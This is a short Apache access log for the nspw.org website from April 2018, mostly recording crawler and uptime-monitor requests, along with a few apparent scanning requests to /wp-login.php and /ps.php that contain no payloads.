www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:19:20:29 -0400] "GET /2009/proceedings/2005/nspw2005-frontmatter.pdf HTTP/1.1" 302 621 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:19:21:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 35.226.23.240 - - [29/Apr/2018:19:21:29 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:19:22:13 -0400] "GET /papers/2011/nsp HTTP/1.1" 302 559 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 112.206.192.22 - - [29/Apr/2018:19:23:37 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.206.192.22 - - [29/Apr/2018:19:23:39 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.78 - - [29/Apr/2018:19:24:03 -0400] "GET /current/cfp.shtml HTTP/1.1" 302 563 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 180.76.15.144 - - [29/Apr/2018:19:26:12 -0400] "GET /1999 HTTP/1.1" 302 496 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 69.162.124.227 - - [29/Apr/2018:19:26:19 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [29/Apr/2018:19:27:23 -0400] "GET /2018/2018/cfp HTTP/1.1" 302 555 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:19:27:36 -0400] "GET /2002/nspw-header.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [29/Apr/2018:19:27:46 -0400] "GET /2002/dates.content HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:28:34 -0400] "POST /ps.php HTTP/1.1" 302 487 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:28:34 -0400] "POST /ps.php HTTP/1.1" 302 487 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:28:34 -0400] "POST /ps.php HTTP/1.1" 302 487 "-" "curl/7.47.0"
www.nspw.org:80 158.69.133.31 - - [29/Apr/2018:19:28:34 -0400] "POST /ps.php HTTP/1.1" 302 487 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.80 - - [29/Apr/2018:19:29:06 -0400] "GET /2007/program.content.new HTTP/1.1" 302 577 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.236 - - [29/Apr/2018:19:29:44 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
